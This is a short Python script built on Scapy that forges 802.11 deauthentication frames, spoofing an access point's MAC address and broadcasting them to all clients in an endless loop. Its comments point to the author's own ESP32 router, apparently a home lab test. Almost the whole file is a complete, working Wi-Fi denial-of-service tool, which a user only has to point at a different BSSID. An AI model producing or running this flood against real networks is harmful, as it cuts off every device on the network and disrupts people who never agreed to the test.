from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
import time
import sys

# --- ENVIRONMENT HARDWARE TARGETS ---
INTERFACE = "wlp0s20f3"            # Your exact laptop Wi-Fi interface name
TARGET_MAC = "ff:ff:ff:ff:ff:ff"    # Broadcast destination (hits all local clients)
BSSID_MAC = "c8:b2:9b:0d:65:e2"     # YOUR ESP32 ROUTER'S PHYSICAL AP MAC ADDRESS
BURST_COUNT = 15                   # Number of frames to inject per loop cycle

def launch_l2_deauth_attack():
    print("="*60)
    print("⚡ FOOBAR IEEE 802.11 LAYER-2 MANAGEMENT FLOOD ENGINE")
    print("="*60)
    print(f"[*] Target Infrastructure MAC : {BSSID_MAC}")
    print(f"[*] Native Injection Interface : {INTERFACE}")
    print("[*] Configuration              : INFINITE REASON-7 LOOP (Ctrl+C to stop)")
    
    input("\nPress [ENTER] to broadcast raw Layer-2 management frames into the air...")
    
    # Forge a standard 802.11 Management Frame structure
    # Type 0 = Management Frame, Subtype 12 = Deauthentication
    packet = RadioTap() / Dot11(addr1=TARGET_MAC, addr2=BSSID_MAC, addr3=BSSID_MAC) / Dot11Deauth(reason=7)
    
    loop_counter = 1
    try:
        while True:
            print(f"[📡 AIRWAVE] Transmitting frame burst #{loop_counter} ({BURST_COUNT} packets)...")
            
            # Send raw Layer-2 packets directly onto the physical radio medium
            sendp(packet, inter=0.01, count=BURST_COUNT, iface=INTERFACE, verbose=0)
            
            loop_counter += 1
            # 500ms delay balances transmission velocity with ESP32 serial buffer limits
            time.sleep(0.5)
            
    except KeyboardInterrupt:
        print("\n[+] Injection halted. Releasing Layer-2 wireless medium channels.")
    except Exception as e:
        print(f"\n❌ TRANSMISSION CRITICAL ERROR: Ensure interface is up. Details: {e}")

if __name__ == "__main__":
    launch_l2_deauth_attack()
